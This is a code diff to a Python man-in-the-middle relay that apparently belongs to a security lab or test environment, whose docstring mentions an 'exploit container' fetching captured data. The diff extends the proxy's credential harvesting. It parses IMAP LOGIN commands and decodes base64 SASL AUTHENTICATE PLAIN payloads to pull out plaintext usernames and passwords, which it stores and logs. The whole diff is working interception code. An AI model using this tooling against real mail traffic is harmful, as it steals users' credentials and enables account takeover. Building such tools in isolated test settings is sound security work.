@@ -10,6 +10,7 @@ Also exposes a lightweight HTTP API on port 8082 for the exploit
 container to retrieve captured data.
 """
 
+import base64
 import http.server
 import json
 import os
@@ -86,33 +87,72 @@ def relay(src, dst, direction, conn_id):
         pass
 
 
+def _capture_credentials(username, password, conn_id):
+    """Store captured credentials."""
+    entry = {
+        "username": username,
+        "password": password,
+        "timestamp": time.time(),
+        "connection": conn_id,
+    }
+    with data_lock:
+        captured_data["credentials"].append(entry)
+    print(
+        f"[mitm] CAPTURED credentials: {username} (conn {conn_id})",
+        flush=True,
+    )
+
+
+def _decode_plain_auth(b64_string, conn_id):
+    """Decode SASL PLAIN base64 payload: \\x00username\\x00password."""
+    try:
+        decoded = base64.b64decode(b64_string)
+        parts = decoded.split(b"\x00")
+        if len(parts) >= 3:
+            username = parts[1].decode("utf-8", errors="replace")
+            password = parts[2].decode("utf-8", errors="replace")
+            if username and password:
+                _capture_credentials(username, password, conn_id)
+    except Exception:
+        pass
+
+
 def parse_client_data(data, conn_id):
-    """Parse IMAP client data for LOGIN credentials."""
+    """Parse IMAP client data for LOGIN and AUTHENTICATE PLAIN credentials."""
     try:
         text = data.decode("utf-8", errors="replace")
     except Exception:
         return
     for line in text.splitlines():
+        # IMAP LOGIN command
         match = re.match(
             r"^[A-Za-z0-9]+\s+LOGIN\s+\"?([^\"\s]+)\"?\s+\"?([^\"\s]+)\"?",
             line,
             re.IGNORECASE,
         )
         if match:
-            username = match.group(1)
-            password = match.group(2)
-            entry = {
-                "username": username,
-                "password": password,
-                "timestamp": time.time(),
-                "connection": conn_id,
-            }
-            with data_lock:
-                captured_data["credentials"].append(entry)
-            print(
-                f"[mitm] CAPTURED LOGIN: {username} (conn {conn_id})",
-                flush=True,
-            )
+            _capture_credentials(match.group(1), match.group(2), conn_id)
+            continue
+
+        # AUTHENTICATE PLAIN with inline initial response
+        match = re.match(
+            r"^[A-Za-z0-9]+\s+AUTHENTICATE\s+PLAIN\s+(.+)",
+            line,
+            re.IGNORECASE,
+        )
+        if match:
+            _decode_plain_auth(match.group(1).strip(), conn_id)
+            continue
+
+        # Bare base64 continuation line (server sent "+" prompt)
+        stripped = line.strip()
+        if (
+            stripped
+            and not stripped.startswith("*")
+            and not stripped.startswith("+")
+            and re.fullmatch(r"[A-Za-z0-9+/=]+", stripped)
+        ):
+            _decode_plain_auth(stripped, conn_id)
 
 
 def parse_server_data(data, conn_id):
